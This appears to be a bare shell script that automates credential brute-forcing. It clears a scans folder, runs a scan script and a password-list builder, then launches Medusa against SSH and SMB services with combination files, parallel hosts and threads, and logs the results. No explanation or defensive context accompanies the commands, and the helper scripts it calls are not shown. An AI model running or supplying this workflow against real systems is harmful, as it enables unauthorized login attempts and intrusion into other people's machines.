rm -rf scans
bash scans.sh 
python user-pass.py
medusa -C medusa-user-pass-22.txt -M ssh -t 6 -T 16 -O ssh_log.txt
python3 ssh-convert.py > to_ssh.txt
medusa -C medusa-user-pass-445.txt -M smbnt -t 6 -T 16 -O log_smb.txt
